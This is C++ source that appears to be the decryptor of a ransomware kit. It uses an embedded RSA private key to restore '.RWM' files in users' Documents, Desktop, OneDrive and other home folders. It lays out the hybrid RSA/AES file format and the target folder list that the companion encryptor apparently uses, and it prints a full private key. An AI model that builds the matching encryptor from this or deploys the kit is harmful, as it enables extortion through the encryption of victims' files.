#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#include <string>
#include <cstring>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>

namespace fs = std::filesystem;

const std::string extension = ".RWM";
const int RSA_KEY_SIZE = 2048;

// Private key in PEM format (replace with your actual private key)
const std::string private_key_pem = R"(
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDAm3IwkPHmfWid
th1fM1PO60805UylC95WdLogF+U2gfg/QC5a4xJnknrUEti0THsNojIIapjqdG9M
jNbMig5QHrWnXGN2ma95GZ7J0oD7/DOvdkpcYPW83Ry1CCfqRep6pMbJnx/C3jg3
L0CCztk+AdUfV4AUOZhehhni/R4QEYPK/U9sfqdjHnaSTMUd8DhwMQj8NjbHbXHT
mI6fpOjQOJFxYg6ryMz7X1vqQcHIn3OO+EIbAQCFCFF0bO3zeCf5vqrc1blLJnnL
RzjjL8NgkCBIBXhiSZOVp4PoI1AA3VXRM1LmIAS1mx2UB9Z4ox8JzHraglFsXHQR
wA2I56ylAgMBAAECggEAXbVjhcCHiNIcK5s2yCIzVNmElGI5e5V+K8cn5URq9y2d
57wksYCH7E9GplazC2modvYibJjcZDmZCv/849AJba67R716APJ9/qfZ6yyZJ8BJ
L0WYoUBlXumfNW7N6LvyfJAdzWu3arpuVF8PfnUAGhyPIewS+wQYn2iUQK1QypS6
GJqrEBZdRUlJQnF+iHG/f4LTGEMkam8IwquC96T7FnqaYNEuh7xaWRlZju8c4TIa
2JkieIl5FS/L529/kNtX3foBiW5UFEajW5VGiu3bmmV2bBlXvUwsnVz1/ZLCO3g5
SPBEr+aUFBkEGK4XmQ0wXnaQcLRY/vS/zQktTUX3UwKBgQDxltHowb30xgOgg89K
1SYydWKA496fMJuCuOgvf8phSDfTEE1k5wtS12UvY4+GcfA3HK7nRBGCnZvM6UEz
yhViD8qmphVaB89ZRx89mjshB303HRiNO/AfE3AlewWr+zg18AkmBdEkv/Q3Wtvj
7aXkUa/6svthXFGWHROrc8EA0wKBgQDMGKYhf1maGcxtX0f8iO2r3whl2AWpXDDP
2tSNS+AkxjMuaKGZxZ3APFjLlLyx2SKqMIHgZF/BrV5/tV7exAtACUpTPsLdbf3A
CYlPDyEmMZR851+mfrnx7+mE++J3bsP4BxR6Bdw/tXIJXxwi+qV64zfVzoW3PKXp
ZwXP+vFxpwKBgQCnDVgGr3lveUDmzF4Za7wm5f6AC5FT2GOgB8YdmirSDAL2Am7R
1+V/mguQsjJ7j+u/4CidJ/dHrz4deiko65LPpQXHKE7ZW08od8KFcVFzrF8MLiVc
+9Y1VtaURDYOzv72ZQ2eaiVNWSJA6KXmPN0aPNYH751dnF2aBG8mfjs2GwKBgHAH
37lndEG4g5RNxvACIaRESxHMYF80sb6GukHNMn49JX8GBB6qcQtClOM7A9EEBZky
AzivIDjp94NWhXr2Vc6Syu+i9cgiRjWRhoOVJHcYpA9j2gdEbME3FhHfSdKRRJTz
HfRVHy8BZFVslb9FomwwKUf9kzyf19qkqHYfo0TlAoGAfnuT7z1e7cRgSHPWmZBn
PNM0gGuwAid1MoXmKI59Q77agrcUbPvCpYUgKzGdzH42tMls96/Fdp5Sv/KfNuiL
Wjgyv796lMxYXpYkFnh98PNBVGtFEcMRxA56181mGMzzIPqYVCrSI6LlEO9DiGAS
zl8yznQAzGg/taFCr1J3TJY=
-----END PRIVATE KEY-----
)";

const std::vector<std::string> Folders = {
    "Documents",
    "Downloads",
    "Favorites",
    "Links",
    "Music",
    "Pictures",
    "Saved Games",
    "Videos",
    "OneDrive",
    "Desktop"
};

// Read entire file into byte vector
std::vector<unsigned char> readFile(const std::string& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file) throw std::runtime_error("Cannot open file: " + path);
    
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<unsigned char> buffer(size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        throw std::runtime_error("Read failed: " + path);
    }
    return buffer;
}

// Write byte vector to file
void writeFile(const std::string& path, const std::vector<unsigned char>& data) {
    std::ofstream file(path, std::ios::binary);
    if (!file) throw std::runtime_error("Cannot create file: " + path);
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
}

// Decrypt file using hybrid RSA/AES approach
std::string decryptFile(RSA* rsa, const std::string& filePath) {
    // Read encrypted file
    std::vector<unsigned char> encrypted_data = readFile(filePath);
    
    // Validate file size
    size_t rsa_encrypted_size = RSA_size(rsa);
    if (encrypted_data.size() < rsa_encrypted_size + 16) {
        throw std::runtime_error("File too small to contain encrypted key and IV");
    }

    // Extract components from encrypted file:
    // [RSA-encrypted AES key][IV][AES-ciphertext]
    std::vector<unsigned char> enc_aes_key(
        encrypted_data.begin(), 
        encrypted_data.begin() + rsa_encrypted_size
    );
    std::vector<unsigned char> iv(
        encrypted_data.begin() + rsa_encrypted_size,
        encrypted_data.begin() + rsa_encrypted_size + 16
    );
    std::vector<unsigned char> ciphertext(
        encrypted_data.begin() + rsa_encrypted_size + 16,
        encrypted_data.end()
    );

    // Decrypt AES key with RSA private key
    std::vector<unsigned char> aes_key(rsa_encrypted_size);
    int decrypted_len = RSA_private_decrypt(
        enc_aes_key.size(),
        enc_aes_key.data(),
        aes_key.data(),
        rsa,
        RSA_PKCS1_PADDING
    );
    
    if (decrypted_len == -1) {
        unsigned long err = ERR_get_error();
        char err_buf[256];
        ERR_error_string_n(err, err_buf, sizeof(err_buf));
        throw std::runtime_error("RSA decryption failed: " + std::string(err_buf));
    }
    
    // Resize to actual AES key length (32 bytes)
    aes_key.resize(32);

    // Initialize decryption context
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) throw std::runtime_error("Context creation failed");
    
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key.data(), iv.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Decryption init failed");
    }

    // Decrypt data
    std::vector<unsigned char> plaintext(ciphertext.size() + EVP_CIPHER_CTX_block_size(ctx));
    int out_len1 = 0, out_len2 = 0;
    
    if (EVP_DecryptUpdate(ctx, plaintext.data(), &out_len1, ciphertext.data(), ciphertext.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Decryption update failed");
    }
    
    if (EVP_DecryptFinal_ex(ctx, plaintext.data() + out_len1, &out_len2) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Decryption finalize failed - corrupted file or wrong key");
    }
    
    EVP_CIPHER_CTX_free(ctx);
    plaintext.resize(out_len1 + out_len2);

    // Write decrypted data
    writeFile(filePath, plaintext);

    // Remove extension from filename
    if (filePath.size() > extension.size() && 
        filePath.substr(filePath.size() - extension.size()) == extension) {
        std::string newPath = filePath.substr(0, filePath.size() - extension.size());
        fs::rename(filePath, newPath);
        return newPath;
    }
    return filePath;
}

void startDecrypting(RSA* rsa) {
    // Get user's home directory
    const char* homeDir = nullptr;
    #ifdef _WIN32
        homeDir = std::getenv("USERPROFILE");
    #else
        homeDir = std::getenv("HOME");
    #endif
    
    if (!homeDir) {
        std::cerr << "ERROR: Could not find home directory" << std::endl;
        return;
    }

    for (const auto& folder : Folders) {
        fs::path fullPath = fs::path(homeDir) / folder;
        
        if (!fs::exists(fullPath)) {
            continue;
        }
        
        try {
            for (const auto& entry : fs::recursive_directory_iterator(fullPath)) {
                if (!entry.is_regular_file()) continue;
                
                std::string path_str = entry.path().string();
                // Check if file ends with our extension
                if (path_str.size() > extension.size() && 
                    path_str.substr(path_str.size() - extension.size()) == extension) {
                    try {
                        std::string new_path = decryptFile(rsa, path_str);
                        std::cout << "SUCCESS: File Decrypted: " << new_path << std::endl;
                    } catch (const std::exception& e) {
                        std::cerr << "ERROR: " << e.what() << " - " << path_str << std::endl;
                    }
                }
            }
        } catch (const fs::filesystem_error& e) {
            std::cerr << "WARNING: " << e.what() << std::endl;
        }
    }
}

int main() {
    // Initialize OpenSSL
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();
    
    // Load RSA private key
    BIO* bio = BIO_new_mem_buf(private_key_pem.data(), private_key_pem.size());
    if (!bio) {
        std::cerr << "ERROR: Failed to create BIO" << std::endl;
        return 1;
    }
    
    RSA* rsa = PEM_read_bio_RSAPrivateKey(bio, nullptr, nullptr, nullptr);
    BIO_free(bio);
    
    if (!rsa) {
        std::cerr << "ERROR: Failed to load RSA private key" << std::endl;
        ERR_print_errors_fp(stderr);
        return 1;
    }
    
    std::cout << "---------------------------" << std::endl;
    startDecrypting(rsa);
    std::cout << "---------------------------" << std::endl;
    
    // Cleanup
    RSA_free(rsa);
    EVP_cleanup();
    ERR_free_strings();
    
    return 0;
}